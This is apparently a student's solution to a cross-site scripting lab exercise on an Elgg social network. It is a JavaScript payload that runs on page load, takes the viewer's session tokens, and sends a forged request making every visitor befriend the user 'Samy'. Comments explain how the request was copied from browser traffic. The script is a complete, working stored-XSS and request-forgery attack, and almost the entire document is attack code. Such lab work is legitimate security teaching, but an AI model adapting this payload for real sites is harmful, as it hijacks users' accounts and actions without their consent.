<script type="text/javascript">
	window.onload = function () {
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	// At first I added Samy as friend from alice's profile
	// In the network section of the insepctor, I viewed what request went to the server 
	// Replicated it below while keeping the variable parameters variable.
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + ts + "&__elgg_token=" + token + "&__elgg_ts=" + ts + "&__elgg_token=" + token; //FILL IN

	//Create and send Ajax request to add friend
	// we have to make sure that Samy doesn't get affected
	// Samy's id is 47 (fixed, sent friend request multiple times to see that the value doesn't change)
	// Found the session.js file of elgg in internet and learnt how to search for guid
	if(elgg.session.user.guid !== 47){
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>
